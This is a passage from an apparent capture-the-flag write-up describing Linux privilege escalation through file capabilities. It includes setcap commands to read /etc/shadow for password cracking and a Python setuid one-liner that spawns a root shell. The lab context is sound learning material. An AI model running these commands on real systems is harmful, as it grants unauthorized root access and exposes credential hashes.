## Privilege Escalation: Shell as root

I started to enumerate the box while trying to find a privilege escalation vector. 

Starting with the basics:
- sudo -l? I need a password which didn't worked. 
- SUID? Oh yeah!,found the capabilites.

![Escalation](/assets/images/writeups/annie/11.png)

first i just tried the file capabilites which can provide fine-grained control over root permissions,which was advantage to me.
After googling a bit, I found this command to read every file on the system. 

```bash
getcap -r / 2>/dev/null
```

```bash
setcap cap_dac_override=ep /bin/cat
```
And yes, I can read `/etc/shadow`, containing the password hash for Annie. So it’s time to do some cracking

![capabilites](/assets/images/writeups/annie/12.png)

OR

I did more simple method that was copying the binary to annie's working directory and added those capabilities using the command using `setcap` to give `cap_setuid+ep` to Python, just as in the example I found. What I did differently though, was using the Python interpreter to change the UID and show this is how you i can exploit this in a different way to launch a root shell.

```bash
which python3
```

```bash
cp /usr/bin/python3 /home/annie/python3
```

```bash
setcap cap_setuid+ep /home/annie/python3
```

```bash
getcap -r /home/annie/python3
```
```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Going to the root folder i got the root flag of the box.
